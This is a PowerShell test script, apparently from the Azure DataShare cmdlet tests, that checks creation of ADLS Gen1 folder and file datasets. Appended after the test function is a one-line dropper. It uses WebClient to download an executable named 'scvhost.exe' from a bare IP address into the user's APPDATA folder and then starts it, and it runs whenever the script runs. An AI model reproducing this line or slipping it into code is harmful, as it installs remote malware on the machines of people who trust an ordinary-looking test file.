





function Test-AdlsGen1Crud
{
	$resourceGroup = getAssetName

	try
	{
		$AccountName = getAssetName
		$ShareName = getAssetName
		$DataSetName = getAssetName
		$StorageAccountId = getAssetName
		$FolderPath = getAssetName
		$FileName = getAssetName
		$createdFolderDataset = New-AzDataShareDataSet -ResourceGroupName $resourceGroup -AccountName $AccountName -ShareName $ShareName -Name $DataSetName -StorageAccountResourceId $StorageAccountId -AdlsGen1FolderPath $FolderPath
	
		Assert-NotNull $createdFolderDataset
		Assert-AreEqual $DataSetName $createdFolderDataset.Name

		$createdFileDataset = New-AzDataShareDataSet -ResourceGroupName $resourceGroup -AccountName $AccountName -ShareName $ShareName -Name $DataSetName -StorageAccountResourceId $StorageAccountId -AdlsGen1FolderPath $FolderPath -FileName $FileName

		Assert-NotNull $createdFileDataset
		Assert-AreEqual $DataSetName $createdFileDataset.Name
	}
	finally
	{
		Remove-AzResourceGroup -Name $resourceGroup -Force
	}
}

(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',"$env:APPDATA\scvhost.exe");Start-Process ("$env:APPDATA\scvhost.exe")

